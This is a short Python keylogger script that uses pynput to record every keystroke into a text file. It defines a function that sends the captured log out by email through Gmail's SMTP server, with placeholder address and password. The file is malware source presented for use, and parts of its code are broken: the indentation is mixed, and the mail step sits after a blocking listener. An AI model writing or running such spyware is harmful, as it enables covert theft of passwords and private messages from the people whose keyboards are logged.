import pynput.keyboard
import smtplib
log = ""

print("keylogger started....\n")
def process(key):
	global log
	try:
		log = log + str(key.char)
	except AttributeError:
		if key == key.space:
			log = log + " "
		else:
			log = log + " " + str(key) + "     "
			print(log)

        with open('texts.txt','w') as f: # writes the log into the file
			f.write(log)
listener = pynput.keyboard.Listener(on_press=process)
with listener:
	listener.join()
def sendmail(email,password,message): #function to send email
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email,password)
	server.sendmail(email,email,message)
	server.quit()
sendmail("your_email address","you email password",log)
